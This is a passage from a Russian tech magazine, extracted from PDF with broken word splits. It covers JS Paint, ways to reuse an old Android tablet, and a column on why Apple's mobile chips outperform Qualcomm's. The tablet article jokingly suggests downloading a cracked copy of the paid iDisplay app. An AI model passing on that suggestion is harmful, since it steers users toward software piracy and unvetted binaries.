         ред, есть переход с выбором ветви. Он может вернуть не только
        на страницу, с которой ты только что вер нулся назад, но и в пре‐
        дыдущие разы.
        В общем, ты уже понял, что nEXT будет отлично смотреться в тай‐
       ловом менеджере неподалеку от Emacs. В остальных случаях смело
         откладывай знакомство с ним до момента, когда у твоего ноутбука
        сломается тачпад.


       JS PAINT — ИДЕАЛЬНЫЙ КЛОН PAINT, КОТОРЫЙ
      РАБОТАЕТ В БРАУЗЕРЕ3        Если по какому‐то из стандартных при ложений Windows и можно
        ностальгировать, то это Paint. Причем ностальгируют о нем не толь‐
        ко те, кто давно перешел на «мак» и Linux, но и пользовате ли пос‐
        ледних версий самой Windows.





       От Windows 95 до XP старина Paint дошел практически без изме‐
        нений, да и со времен Windows 3.1 преобразился не сильно. А вот
        с Windows Vista начались метаморфозы: то приделают панель Rib‐
         bon, то предлагают рисовать реалистичными красками, то вообще
        превратят в причудливый 3D‐редактор. Какие, к черту, краски?
        Какой 3D?! Где нам теперь делать первые шаги в пиксель‐арте
        и малевать корявые мемасы?
          JS Paint — это поразительно удачная попытка воссоздать в бра‐
         узе ре милую сердцу простоту того самого Paint из Windows 98.
        Здесь всё на своих местах, всё так, как и дол жно быть. Есть даже
        справка!





       А если поискать, то обнаружатся и новые приятные возможности —
        например, бесконечная отмена, воз можность загружать GIF и SVG,
        сохранять PNG с проз рачностью (ставь гал ку Transparent в свой ствах
        документа) и даже записывать анимацию по ходу рисования (прос то
       нажми Ctrl‐Shift‐G и выгружай файл).
         Полное руководство и исходники ты найдешь на странице GitHub.
       Там же есть список  того,  что автор собирается реализовать
        в будущем (как нас чет возможности редактировать файлы иконок
        с картинками раз ного раз мера?), и занятные факты о самом Paint.
X‐MOBILE

   ВТОРАЯ
  ЖИЗНЬ
   СТАРОГО
    ПЛАНШЕТА




            КАК С ПОЛЬЗОЙ ПРИМЕНИТЬ
            УСТАРЕВШИЙ ДЕВАЙС





Новые устройства на Android появляются
с завидной регулярностью. Старые тор‐
мозят и уже не справ ляются с современ‐
ными играми и ресурсоемкими приложе‐
ниями. Отдавать или выкидывать их жалко,      Дмитрий Подкопаев aka                                                                      BRADA
а покупать их ник то не хочет. Пора стрях‐        john.brada.doe@gmail.com
нуть пыль со старых план шетов. На при‐
мере Nexus 7 в этой статье я покажу,
как можно не совсем стандартно исполь‐
зовать старый планшет в различных сце‐
нариях. Не будем останав ливаться на ба‐
нальных  читалках  и  книгах  рецеп тов
для повара. Перейдем на уро вень выше.


ДОПОЛНИТЕЛЬНЫЙ МОНИТОР
Вряд ли небольшой планшет будет очень удобен в качестве допол нительного
монитора, но его можно использовать для вывода важной информации.
В маркете есть приложение iDisplay, поз воляющее решить эту задачу. Стоит
оно аж 17,99 доллара, но ты всегда сможешь найти ломаную версию на всем
известном сайте (конечно же, только для того, чтобы ознакомиться со все ми
функциями и решить, нуж на прога или нет).
   iDisplay работает в кооперации с серверной частью для компа: getidisplay.‐
com. После установки обоих приложений коннектим устройства к одной Wi‐Fi‐
сети (в будущем разработчики обещают поддержку подключения через USB),
и можно приступать.
   Планшет можно настроить как в качестве второго дисплея, так и в качестве
зеркала основно го, при этом в углу отоб ража ется оставшийся заряд батареи.
Есть полная поддержка тачс крина (нажатие для клика, удержание для ими‐
тации клика правой кнопки). Также работает pinch‐to‐zoom, при этом в пра‐
вом верхнем углу появляет ся сво еобразная мини‐карта, по которой можно
понять текущее положение приближенного учас тка и передвинуть  его.
Из меню можно вызвать клавиатуру или запус тить приложение. Настраивает‐
ся разрешение экрана и воз можность отоб ражения системных звуков Win‐
dows (стоит отметить, что изна чально приложение разрабатывалось для связ‐
ки с Mac и, соот ветственно, имеет клиенты для iOS). В общем, для просмотра
серьезного контента решение вряд ли сгодится, но, чтобы вывес ти допол‐
нительную инфу/меню/окно при занятом основном экране, впол не подойдет.





                    Нас трой ки и работа iDisplay


ИНФОРМАЦИОННАЯ ПАНЕЛЬ ДЛЯ МАШИНЫ
Все, что для этого необходимо, — выб рать наибо лее удобный держатель
для планшета в автомобиль (лично я предпочитаю крепеж в слот CD, все рав‐
но им никто не пользуется) и поставить на планшет программу по вкусу.
Опять‐таки выбор довольно большой.
   Стоит попробовать Android  Auto,  тот самый, что предус танавливают
на различные автомобили. Он предназна чен только для телефонов, но све‐
жий установочный файл всегда мож но най ти на apkmirror.com. На главном
экране появляются важные уведомления, подсказ ки навигатора, управление
музыкой. А внизу всегда будут доступны ярлыки для запус ка Google Maps,
телефона и Google Play Music.





                Главный экран и навигация в Android Auto

Также в маркете можно найти AutoMate и Car dashdroid. Первая показы вает
места поблизости, прогноз погоды и огра ничения скорости, имеет управле‐
ние голосом, а также интегра цию с Torque, что поз волит просматривать дан‐
ные с датчиков авто с помощью дополнительного девай са, работающего
через OBDII.
   Вторая имеет поддержку аудиоплееров (Spotify, Play Music, Pandora, Pow‐
eramp и других), голосовое управление и настраиваемый главный экран.





                  Экраны AutoMate и Car dashdroid

Но, на мой взгляд, наиболее гармонично вписывается в интерьер планшет
с запущенным Car Launcher AG. Нас траиваемые кнопки для радио, музыкаль‐
ного плеера, навигации, бра узера. Показывает скорость и время стоянки.
Отображает погоду, статус Wi‐Fi и Bluetooth, управление текущей музыкой
и настройки яркости.





                  Ин терфейс Car Launcher AG

Конечно, есть более серь езные варианты исполь зовать планшет в машине.
На тематических форумах найдется много проектов полной интеграции
с  автомобильной медиасистемой,  в дополнение  к штатной магнитоле
в качестве голов ного устройства с обеспечением работы кнопок на руле.
Но это уже совсем другая история.


МИНИ-ТЕЛЕВИЗОР ДЛЯ КУХНИ
Приложений для просмотра телевидения в маркете много, каждый найдет
себе по вкусу. Прин цип работы у них один: по сути это оболочка, которой
можно скармливать плей‐лис ты IPTV своего провайдера или найденные
в открытых источниках (обычно в виде M3U или XSPF).
  В качестве примера можно привести IPTV, который также под держивает
мультикаст‐потоки через UDP‐прокси, имеет категории каналов, историю
плей‐листов, телепрограммы в форматах XMLTV и JTV. Также популярен кли‐
ент LAZY IPTV, который имеет чуть больше воз можнос тей: это поддержка ссы‐
лок vk‐видео/YouTube; вос произведение плей‐лис тов интернет‐радио через
встроенный проигрыватель; автообновления плей‐лис та; экспорт плей‐лис‐
тов и избранного в файл в раз личных форматах; напоминания о передачах
из ТВ‐программы; поиск каналов по всем плей‐лис там; сис тема родитель‐
ского контроля.





                      Список каналов IPTV

Другая технология для просмотра передач — это программа Torrent Stream
Controller, работающая в режиме peer‐to‐peer. Пос ле первого запуска пред‐
ложит скачать и установить Ace Stream Engine, необходимый для работы.
На момент написания статьи содержит 929 каналов, раз битых по категориям.
Приложение также позволяет запускать любой torrent‐файл и начать прос‐
мотр, не дожидаясь пол ной загрузки.





       Доступные катего рии с каналами в Torrent Stream Controller


БЮДЖЕТНАЯ СИСТЕМА ВИДЕОНАБЛЮДЕНИЯ
Сценариев использования видеонаблюдения может быть несколько, но оста‐
новимся на варианте «видеоняни» в локальной Wi‐Fi‐сети. Планшет можно
использовать с двух сторон: в качес тве монитора с сетевой или IP‐камерой
(например, повесить над входной дверью либо из окна или с бал кона сле дить
за машиной) или же он может выступать в роли такой камеры. Отдельной IP‐
камеры у меня нет, поэто му покажу прин цип работы планшета в связке
с Nexus 5.


Прием изоб ражения
Поставим на телефон IP Webcam. Она может отдавать видео в сеть в разных
форматах, поддерживает прос мотр через бра узер и позволя ет настроить
вклю чение и запись в случае обнаружения движения. После запуска нап‐
равляем камеру смартфо на в нужное место, блокируем экран и подключаем
смартфон к заряднику.





                      Нас трой ки IP Webcam

Принимать изображение на планшете будем через tinyCam Monitor. Пос ле
установки вызываем меню свайпом слева и находим пункт «Сканировать
сеть». После сканирования дос тупных в сети камер, а их может быть нес коль‐
ко, добав ляем нужную нажатием соответству ющей иконки в углу. Затем
переходим во вкладку «Просмотр», ждем соеди нения и смотрим картинку
с телефона.





      Наблюдаем за двором с помощью камеры Nexus 5 и планшета


План шет в качестве камеры
Тут все очень просто: меня ем приложения мес тами и смотрим происходящее
на телефоне. Если нужно усложнить задачу и смотреть поток вне дома, проще
воспользоваться специальным сервисом, например Ivideon. Пос ле простой
регистрации он даст дос туп к подключенным камерам через браузер. Опи‐
санная выше IP Webcam как раз имеет интегра цию с Ivideon (включается
в настройках).
   У  Ivideon есть удобное приложение, которое позволит подключиться
к камерам из любой точки мира. Одна из при мечательных особенностей
программы — push‐уведомления, когда в поле зрения камеры замечается
движение. При этом можно пос мотреть десятисекундный ролик, сня тый
при обнаружении движения. Платной подпиской активируется запись всего
потока с камер в обла ко. Для возможности передачи потока с обычной
веб‐камеры необ ходимо дополнительно пос тавить Ivideon server.





    Просмотр видеопотока через мобильную сеть и push‐уве домления
                                     Ivideon


МОНИТОР СИСТЕМНЫХ РЕСУРСОВ
Решение для истинных гиков. Ставим на комп серверную часть, на планшет
прогу Remote System Monitor, придумываем пароль на компе, коннектим
с планшета и смотрим на полную информацию о железе компа, включая:
 • температуру (процессора, видеоускорителя, жестких дисков и прочего);
 • загруженность CPU и GPU;
 • использование оперативки, видеопамяти и файла подкачки;
 • отображение воль тажа;
 • полную инфу о жестких дисках, в том числе ско рость записи/чте ния;
 • скорости вращения вентиляторов и возможность их контроля (если
   это предусмотрено);
 • скорость передачи данных по сети.





                      Remote System Monitor


ФОТОРАМКА
Планшет легко превратить в фоторамку для показа нужных фотографий
или альбомов. Программ в маркете для этого хватает. Например, Photo
Slides — простая фоторамка, множес тво нас троек, в бете поддержка DLNA.
Среди настроек есть длительность показа фото, скорость обновления,
эффекты, выбор отоб ражения только фото, совпада ющих с текущей ориента‐
цией, часы поверх фото, запуск только при подклю чении внешнего источника
питания. В платной версии дополнитель но можно выб рать дви гающуюся
панораму, настроить запуск по расписанию.
  Для тех, кто хочет видеть фото в том числе из соци альных сетей, есть при‐
ложение Dayframe (Photos & Slideshow). Оно умеет показывать фотографии
из Facebook, Dropbox, Flickr, Instagram, Tumblr, Twitter, 500px, Google+ и Google
Photo.





                       Нас трой ки Dayframe


МЕДИАЦЕНТР
Если поддержка сим‐карт есть не во всех моделях планшетов, то Wi‐Fi и Blue‐
tooth встроены везде. Поэто му качаем музыку на планшет или, чтобы было
разнообразие, просто ставим один из многочисленных сервисов потокового
вещания типа TuneIn Radio, SoundCloud или Spotify Music. Дальше дело тех‐
ники: или через Bluetooth к колонке, или через mini‐jack к любому устройству
с аудиовходом или колонкам.





        Каталог TuneIn Radio и подборка плей‐лис тов в SoundCloud


ГОЛОСОВОЙ АССИСТЕНТ
Планшет легко превратить в «Amazon Alexa для бедных». Достаточно пос‐
тавить его на зарядник, деактивиро вать отключение экрана и задавать воп‐
росы через Ok, Google. Также можно вос пользоваться рус скими помощ‐
ницами — ассистентом Дусей или яндексовской Алисой. Если Гугл подойдет
в основном для простого поиска информации в интернете и ее озву чивания
голосом,  то последние две  прог раммы поддерживают  гораздо более
широкий спектр команд.
  Дуся может делать напоминания, перево дить текст, зачитывать новос ти,
считать, управлять умным домом и домашним кинотеатром, устанавливать
таймеры и будильники, искать маршруты общес твенного транспорта, имеет
доступ к «ВКонтакте» и интегра цию с тас кером. Ну а с помощью скриптов (их
можно установить через само приложение) получится значительно рас‐
ширить встроенные возможнос ти ассистента. Например, поиграть с ботом
в города, найти и поставить музыку из ВК, написать сооб щение в WhatsApp
и Viber, вызвать такси, послушать случай ный анекдот или загадку и так далее.
Ну а одной из самых полезных функций будет озвучивание голосом уведом‐
лений от других программ.
   У Алисы набор возможностей поменьше, но и среди них есть полез ные:
запуск музыки, игры, поиск информации, а также управле ние компом.





              Список функций и каталог скриптов Дуси


ИНФОРМАЦИОННАЯ ПАНЕЛЬ
Хочешь всегда быть в курсе событий? Нет ничего проще. Ставь любой пон‐
равившийся прогноз погоды и новостную лен ту, добавляй виджеты на экран
и не забудь вклю чить опцию «Не выключать экран во время зарядки» в нас‐
тройках для разработчиков (напомню, что они станут доступны, если в меню
«О планшете» тапнуть семь раз на номере сборки).





                      Погода и виджеты


РЕТРОКОНСОЛЬ
Ну и напоследок немного нос тальгии. Если ста рые по сегодняшним меркам
планшеты и телефоны не потянут современные игры, они все еще могут пос‐
лужить в качестве инструмента для возврата в девяностые. В маркете много
различных эмуляторов NES (у нас более извес тная своим клоном Dendy),
SEGA, GameBoy, PS и прочего.
   Большинство эмулято ров уже содержат игры, в других необходимо пред‐
варительно качать игровые файлы или архи вы. Ну а для более комфортной
игры можно воспользоваться Sixaxis Controller, которая позволяет исполь‐
зовать джойстики Sixaxis и Dual Shock 3/4. Кста ти, у меня прекрасно зарабо‐
тал китайский клон, купленный на eBay.
   Если же твоей пер вой «консолью» был ста ционарный комп, то можно пос‐
тавить DosBox Turbo, который поддерживает Voodoo Graphics, IPX Networking,
PCI Devices и Windows, включая DirectX. А это зна чит, можно взять с собой
в дорогу DOOM, Quake, Warcraft 2, Starcraft 1, Fallout 2, Diablo 2, Age of Empires
2 и другие классические шедевры.
  Минимальные требова ния: Dual‐core 1,2 ГГц, Adreno 220 / Nvidia Tegra 2,
256 Мбайт RAM (но лучше 1 Гбайт), 2 Гбайт свободной памяти. Полный спи‐
сок поддерживаемых игр можно найти на XDA.





                       Старая доб рая Contra


ЗАКЛЮЧЕНИЕ
Конечно, это не все возможные применения старых устройств. Для всех вари‐
антов просто не хватило бы нес кольких статей, но, надеюсь, я в очередной
раз направил тебя на интерес ный путь и подвиг на эксперименты. А как ты
используешь свой старый планшет или телефон?
X‐MOBILE

        IPHONE ПОЧЕМУ
 БЫЛ И БУДЕТ



  КОЛОНКА
   ОЛЕГА
                                                                         Олег Афонин
                                                                                Эксперт по мобильной  АФОНИНА                                                                              криминалистике компании
                                                                                  «Элкомсофт»
                                                                                        aoleg@voicecallcentral.com

    БЫСТРЕЕ
  СМАРТФОНОВ
      ANDROID   НА


Почему iPhone 7 работает быстрее Samsung Galaxy S7,
а iPhone 8 — быс трее Galaxy S8? Дело тут в различной иде‐
ологии  операционных  систем,  а  кро ме  того,  одним
из основных преимуществ Apple были и остаются уникаль‐
ные сис темы на кристалле. Про цессоры A10 и A11 заметно
обгоняют в бенчмарках аналогичные пред ложения от Qual‐
comm в лице Snapdragon 820/821 и Snapdragon 835 соот‐
ветственно. Почему так происходит? В чем зак лючается
«магия Apple»? Оставив за бортом  аргументы в стиле
«Андроид лудше!», попробуем разобраться в причинах,
которые привели к превосходству мобильных процессоров
Apple над предложениями Qualcomm.


ФАКТОР ПЕРВЫЙ: ТАК СЛОЖИЛОСЬ
Вспомним 2013 год. В арсенале Qualcomm — весь ма удачные чипы Snap‐
dragon 800, основанные на 32‐разрядных ядрах Krait 400 собственной раз‐
работки. На этом чипе (и его пос ледова теле, Snapdragon 801) были выпуще‐
ны десятки, если не сотни самых раз нооб разных моделей. На момент анонса
у топового чипсета Qualcomm просто не было альтернатив: основанные
на ядрах ARM Cortex A15 решения были прожорливы до чрезвычай нос ти и не
могли составить конкуренцию четырем кастомным ядрам Krait. Вроде бы все
хорошо, Qualcomm — царь горы, дос таточно про дол жать развивать удачную
архитектуру. Казалось бы, что может пойти не так?
  Но — по порядку. В 2011 году компания ARM Holdings анонсировала архи‐
тектуру ARMv8, использование которой откры вало многочисленные воз‐
можности ускорения час ти специальных видов вычислений — например,
потокового шифрования, которое (забегу вперед) сегодня используется
практически во всех смартфо нах. Первыми мобиль ными ядрами данной архи‐
тектуры стали Cortex A53 и A57, анонсированные хол дингом ARM в 2012 году.
В то же время в ARM прогнозировали выход готовых процессоров на новых
ядрах лишь на 2014 год. Вот только Apple, обладатели архи тектурной лицен‐
зии ARM, успели первыми — почти на год рань ше конкурентов.
   Итак, в ноябре 2013‐го Apple выпускает iPhone 5s. Помимо датчика отпе‐
чатков пальцев и встроенной системы безопас ности Secure Enclave, новый
iPhone впервые на рынке осна щается 64‐раз рядным процессором Apple A7
ARMv8. Новый процессор показывает чудеса производительности в Geek‐
bench: результат двухъядерного процессора в однопоточных вычислениях
в пол тора раза превосходит результаты ядер Krait 400, в многопоточных наб‐
людается паритет.
   Расширенный набор команд ARMv8 при шел ся как нельзя более кстати:
именно в iPhone 5s Apple встроила аппаратную систему безопасности Secure
Enclave, которая отвечает в том числе и за шифрование данных. С точки зре‐
ния Apple выбор 64‐разрядной архитек туры был впол не логичен: только
в ядрах с поддержкой ARMv8 появились инструкции для ускорения потоко‐
вого шифрования, которое на тот момент использовалось Apple уже доволь‐
но давно. В дальнейшем использование новых ядер позволило Apple добить‐
ся беспрецедентных  скоростей доступа  к зашифрованным данным —
выпущенный на год поз же Nexus 6, основанный на 32‐разрядном Qualcomm
Snapdragon 805 (ARMv7), показывал ужа сающую про изводительность потоко‐
вого крипто: доступ к зашифрованным данным осуществлял ся в 3–5 раз мед‐
леннее, чем к незашифрованным.
  Поначалу 64‐разрядная архитектура в смартфонах воспринималась обы‐
вателями — да и многими экспертами — как чис тейшей воды маркетинг. Так
считали пользователи, и так говорили руководители Qualcomm — по крайней
мере, в своих официаль ных выступлениях.
  В 2014 году выходит iPhone  6, оснащенный процес сором A8, также
работающим с системой команд ARMv8. Чем отвечает Qualcomm? Неболь‐
шим обновле нием: на рынке доминируют смартфоны, работающие на Snap‐
dragon 801 (32 бита, ARMv7). Также выходит Snapdragon 805, использующий
те же ядра Krait 400, но с более мощным GPU. Процес соры Apple оказыва‐
ются быстрее аналогов от Qualcomm как в однопоточных, так и в многопоточ‐
ных вычислениях, а в специфических применениях — например, в реализации
поточного шифрования — обхо дят решения конкурентов просто в разы. Qual‐
comm усиленно делает вид, что ничего необычного не происходит, но про‐
изводители, наступая на горло, требуют конкурентоспособную SoC. Qual‐
comm ничего не остается, как вклю читься в гонку.
  В 2015 году Apple выпускает iPhone 6s и A8, Qualcomm — чип Snapdragon
810 и его урезанную версию Snapdragon 808. Эти процессоры яви лись отве‐
том Qualcomm на требования партнеров. Однако отсутствие опы та раз работ‐
ки 64‐разрядных чипов сыграло с ком панией злую шутку: оба процессора
оказались чрезвычайно неудачными. С первых же дней процес соры проявили
склонность  к чрезмерному энергопотреблению, перегреву и  тротлингу,
в результате которого их устоявша яся производительность через нес колько
минут работы мало отличалась от про изво дитель нос ти Snapdragon 801.
   Какой же из всего этого можно сделать вывод? Вывод один: Apple застала
индустрию врасплох, использовав ядра с новой архитектурой тогда и там,
где, казалось бы, в этом нет никакой необ ходимос ти. В результате Qualcomm
оказалась в роли догоняющей, а Apple получила фору в полтора года. Почему
так произошло?
   Здесь нужно рассмотреть особенности цикла раз работки мобильных про‐
цессоров.





      Сравнение производительнос ти Apple A9 и других процессоров


ФАКТОР ВТОРОЙ: РАЗНИЦА В ЦИКЛАХ РАЗРАБОТКИ
Итак, мы выяснили, что Apple уда лось выр ваться вперед, на полтора года
опередив конкурентов. Как такое могло случить ся? При чина в разнице в цик‐
лах разработки у Apple и производителей смартфонов под управлением
Android.
   Как известно, Apple полностью контролиру ет раз работку и производс тво
iPhone, начиная с самого низкого уровня — проектирования процессора.
И если графические ядра до недавнего времени Apple лицензировала у Imag‐
ination Technologies, то процес сорные ядра компания предпочитала раз‐
рабатывать самостоятельно.
   Как выглядит цикл разработки у Apple? На основе архитектурной лицензии
ARM проектируется процессор, совместимый с заданной сис темой команд
(ARMv8). Одновременно  разрабатывает ся смартфон,  в  котором  будет
использоваться данный про цес сор. Параллель но для него создаются все
необходимые драйверы, ОС, производится оптимизация. Все происходит
в рамках одной компании; у раз работчиков ОС нет никаких проблем с получе‐
нием доступа к исходным кодам драйверов, а разработчики драйверов,
в свою оче редь, имеют воз можность общать ся с людьми, проектировавшими
процессор.





                                Apple A11

Производственный цикл устройств на Android выглядит совершенно иначе.
  В первую оче редь в игру всту пает ARM, разработчик одноименных систем
команд и процессорных архитектур. Именно ARM проектирует референсные
процессорные ядра. Так, в далеком 2012 году были анонсированы ядра ARM
Cortex A53, на которых основано подавляющее большинство смартфонов,
выпущенных в 2015, 2016 и 2017 годах.
  Минуточку! 2012? Именно так: 64‐разрядные ядра A53 были анонсированы
в октябре 2012 года. Но архитектура ядра — это одно, а реальные процес‐
соры — совсем другое: ARM Holdings их прос то не выпускает, предлагая пар‐
тнерам референсные дизайны, но не поставляя на рынок сами SoC. Прежде
чем на рынке появится смартфон, основанный на той или иной архи тектуре,
кто‐то должен разработать и выпустить готовую систему на крис талле, SoC.
  Несмотря  на  публичные  выс тупления  собс твенных  представителей,
в 2013 году в Qualcomm усиленно работа ли над выпуском 64‐битного про‐
цессора. На разработку собственного ядра времени не оставалось; приш‐
лось брать что дают. Давали — архитектуру big.LITTLE, куда на тот момент
входили «малые» ядра Cortex A53 (удачные) и «большие» ядра A57 (довольно
спорные с точки зрения энергоэффективности и трот линга).
  Первые процессоры Qualcomm, основанные на этих ядрах, были анон‐
сированы в 2014 году. Но ведь процес сор — это еще не все! Как минимум
нужен еще корпус, экран... Все это выпускают OEM‐производители, которые,
собственно говоря, и занимаются раз работкой и производством смартфо‐
нов. А это тоже время, и время немалое.
  Наконец, опе рационная система. Для  того  чтобы «завести»  Android
на устройстве, необходим набор драйверов для нового чипсета. Драйверы
разрабатывает разработчик чипсета (например, Qualcomm), предоставляя их
производителям смартфонов для интеграции. На то, чтобы разобраться
и интегрировать драйверы, у производителя также уходит определенное вре‐
мя.
  Но и это еще не конец! Уже готовый смартфон с работающей версией An‐
droid необходимо еще и сертифицировать в одной из лабораторий Google
на предмет сов местимос ти и соответс твия Android Compatibility Deﬁnition.
Это — тоже время, которого и без того катас трофически мало.
  Иными словами, в том, что смартфоны на Snapdragon 808/810 мы увидели
лишь в 2015 году, нет совершенно ничего удивительного. Первые флагман‐
ские чипы Qualcomm, основанные на 64‐раз рядной архитектуре, отстали
от SoC Apple на пол тора года. Это историчес кий факт, и это — реальное пре‐
имущество Apple.
  В 2015 году длительный цикл разработки и требования партнеров сыграли
с Qualcomm злую шутку: первый блин ока зался комом. Впрочем, компании
удалось реабилитироваться с выходом Snapdragon 820. Но не было ли слиш‐
ком поздно?





                   Qualcomm Snapdragon 820


ФАКТОР ТРЕТИЙ: ВОПРОС РАЗМЕРА
Рассмотрим таблицу, в которой сравнива ются два последних поколения про‐
цессоров Apple и Qualcomm.


       1. Техпро цесс

      A10 FUSION: 16 нм

      A11 BIONIC: 10 нм

      SNAPDRAGON 820: 14 нм

      SNAPDRAGON 835: 10 нм


       2. CPU

      A10 FUSION: 64‐bit Quad‐core, 2 Hurricane 2,34 ГГц + 2
        Zephyr

      A11 BIONIC: 64‐bit Hexa‐core, 2 Monsoon + 4 Mistral

      SNAPDRAGON 820: 64‐bit Quad‐core, 2 Kryo 1,59 ГГц + 2
        Kryo 2,15 ГГц

      SNAPDRAGON 835: 64‐bit Octa‐core, 4 Kryo 280 2,45 ГГц +
       4 Kryo 2801,9 ГГц


       3. Управле ние ядрами

      A10 FUSION: По кластерам

      A11 BIONIC: По ядрам

      SNAPDRAGON 820: По ядрам

      SNAPDRAGON 835: По ядрам


       4. GPU

      A10 FUSION: 6 core

      A11 BIONIC: 3 core

      SNAPDRAGON 820: Adreno 530

      SNAPDRAGON 835: Adreno 540


       5. Geekbench одно поточ ный

      A10 FUSION: 3438

      A11 BIONIC: 4216

      SNAPDRAGON 820: 1698

      SNAPDRAGON 835: 1868


       6. Geekbench мно гопо точ ный

      A10 FUSION: 5769

      A11 BIONIC: 10118

      SNAPDRAGON 820: 3996

      SNAPDRAGON 835: 6227




                                          Данные с сайта Geekbench

   Что мы видим из этой таблицы? Легко заметить, что производительность
в расчете на одно ядро в процессорах Apple в два с лишним раза превос‐
ходит решения Qualcomm, да и многопоточная производительность актуаль‐
ных поколе ний процессоров отличается практичес ки в полтора раза. Почему
так получается? Ответ можно попробовать найти в следующей табличке.


       1. Техпро цесс

      A10 FUSION: 16 нм

      A11 BIONIC: 10 нм

      SNAPDRAGON 820: 14 нм

      SNAPDRAGON 835: 10 нм


       2. Пло щадь чипа

                               2      A10 FUSION: 125 мм

                                2      A11 BIONIC: 87,66 мм

                                       2      SNAPDRAGON 820: 113,7 мм

                                      2      SNAPDRAGON 835: 72,3 мм



Если отбросить пару процессоров A10 Fusion / Snapdragon 820, в которых
используются разные технологичес кие процессы, можно сравнить площадь
чипов A11 Bionic и Snapdragon 835. Площадь поверхности чипа от Apple
в 1,2 раза превышает площадь решения Qualcomm. Что это означает на прак‐
тике? Возможность использовать больше транзисто ров, более продвинутую
архитектуру ядер. В час тности, исследователи обнаружили, что в A11 Bionic
«слабые» процессорные ядра в несколько раз крупнее малых ядер A53 (прос‐
тите — Kryo 280), использующихся в Snapdragon 835. Это означает, что даже
«малые» ядра A11 Bionic поддерживают внеочередное исполне ние команд,
что позволяет получить большую произво дительность на такт в сравнении
с прямолинейными ядрами А53.
  Площадь процессора нап рямую влияет на его цену. Чем больше площадь
(при использовании одного техпроцес са), тем выше себестоимость. Что под‐
водит нас к очередному фактору: стоимости про цес сора для производителя.


ФАКТОР ЧЕТВЕРТЫЙ: ВОПРОС ЦЕНЫ
Согласно отчету Android Authority пло щадь про цес сорных ядер Apple A10 Fu‐
sion вдвое превышает площадь ядер ближайшего конкурента, Snapdragon
820.
   «Преимущество Apple в том, что компания может себе позволить пот‐
ратить деньги на увеличение пло щади процессора, пос троенного по пос‐
ледней 16‐нанометровой технологии FinFET... Нес колько лишних долларов
не сыграют большой роли в конечной стоимости устрой ства — а ведь Apple
сможет продать значительно больше 600‐долларовых устрой ств благодаря
настолько большой производитель нос ти», — пишет Линли Гвеннап, директор
The Linley Group.
  Действительно, лишние пять‐шесть дол ларов не сыграют большой роли
в конечной стоимости iPhone — это доли, в худшем слу чае единицы процен‐
тов его стоимости для потребителя. Но если эти пять‐шесть долларов спо‐
собны удвоить производитель ность устройства по сравнению с конкурентами
на Android — это прекрасный аргумент в пользу Apple.
  Почему так не выходит у Qualcomm? В цепочке разработки процессоров
для устройств под Android слишком много заин тересованных лиц. Это и ARM,
которая разрабатывает и лицензиру ет процессорные ядра, и Qualcomm,
которая проектирует готовые процессоры по лицензии, и производители
смартфонов с Android. У OEM‐про изво дителей, вынужденных конкурировать
между собой ценами, на счету каждый доллар. Производители хотят как мож‐
но более дешевых SoC (поэто му, кстати, до сих пор так популярны решения,
построенные на архаичных слабых ядрах A53), и Qualcomm приходится с этим
считаться. Но и Qualcomm, и ARM хотят откусить кусок пирога, получив свою
долю прибыли, — так что себестоимость решения, аналогичного процес‐
сорам Apple, вышла бы даже более высокой, чем у Apple. В результате OEM‐
производители не смогли бы себе поз волить мас совых закупок таких процес‐
соров, что еще увеличило бы их стоимость. (Кстати, именно это случилось
с процессором MTK Helio X30 — он не пользовался спросом, и на его основе
выпустили лишь два смартфона.)
  Конечно, здесь можно аргументировать, что у Samsung и Huawei есть
собственные линейки процессоров — Exynos и Kirin соответственно. Но у
Huawei нет своих разработок, в компании берут готовые ядра ARM Cortex
и готовые же графические ускорители ARM Mali, собирая «собс твенные» про‐
цессоры на их основе. Понятно, что вычислитель ные ядра этих процессоров
не могут быть мощ нее тех, что предлага ет ARM. В Samsung же пробуют идти
путем Apple, выпуская собственные кастомизированные ядра — произво‐
дительность которых, впрочем, недалеко уходит от обычных «стоковых» ядер
ARM.


ФАКТОР ПЯТЫЙ: ВОПРОС КОНТРОЛЯ
В прошлом году в Apple сделали интересную вещь: волевым решением убра‐
ли поддержку 32‐разрядных приложений из iOS 11. Так уж совпало, что имен‐
но на этой версии ОС вышла новая линейка iPhone: 8, 8 Plus и X. Что это озна‐
чает с точки зре ния произво дительнос ти?
  Возможность взять и отка заться от поддержки 32‐разрядных команд дает
очень и очень многое. Упрощаются блоки декодирования и исполнения,
уменьшается требуемое число транзисторов. Куда идет эта экономия? Ее
можно потратить на умень шение площади процессора (что напрямую тран‐
слируется в сниженную себестоимость и умень шенное энергопотребле ние),
а можно при неизменной пло щади и энергопот реблении добавить транзисто‐
ров в другие блоки, увеличив тем самым про изводительность. Скорее всего,
именно по второму сценарию развивались события и процессор A11 Bionic
получил дополнительные 10–15% производительности именно за счет отказа
от поддержки 32‐разрядного кода.
  Возможно ли подобное в мире Android? Да, воз можно, но не полностью
и очень нескоро. Лишь с августа 2019 года вступают в силу требования к раз‐
работчикам, которые должны будут при добавлении или обновлении при‐
ложений в Google Play Store в обязательном порядке включать 64‐битные
версии двоичных библиотек. (Отметим здесь, что далеко не все — и даже
не большинство! — приложения Android вооб ще используют какие‐либо дво‐
ичные библиотеки, зачас тую довольству ясь динамически транслируемым
байт‐кодом.) Напомним,  Apple  ввела ана логичное  требование  в фев‐
рале 2015 года — опять преимущество во времени, на сей раз в четыре
с половиной года.


ФАКТОР ШЕСТОЙ: ОПТИМИЗАЦИЯ И ИСПОЛЬЗОВАНИЕ
ДОСТУПНЫХ РЕСУРСОВ
Оптимизация — важнейшая сос тавляющая производительнос ти. Традици‐
онно у Apple с оптимиза цией все было или идеаль но, или образцово (поль‐
зователи, которые жалу ются на упавшую про изводительность старых устрой‐
ств, обновившихся до пос ледней вер сии iOS, прос то не понимают, какой ад
был бы на таком слабом железе, если бы на нем запус тили Android). А вот
у Android с оптимизацией все... пестро. Разнообразно. Можно сказать —
феерично.
   Чаще всего достаточно быс тро на свежем железе работают чистые сборки
Android — такие, что используются в смартфо нах Google Nexus и  Pixel,
устройствах Motorola и Nokia. Но даже и здесь не все хорошо: например,
в смартфоне Google (Motorola) Nexus 6 были совершенно потрясающие
воображение проб лемы со скоростью дос тупа к накопителю, возникшие
из‐за безграмотной реализации шифрования (раз работчики Google не спра‐
вились с аппаратным ускорителем криптогра фичес ких операций процессора
Snapdragon 805, после чего заявили, что «прог раммная реализация лучше»).
Вот в этой статье мы подробно проанализировали скорость чте ния и записи
зашифрованных данных смартфо ном Nexus 6, сравнив ее со скоростью ана‐
логичных операций в iPhone 5s. Вот циф ры:
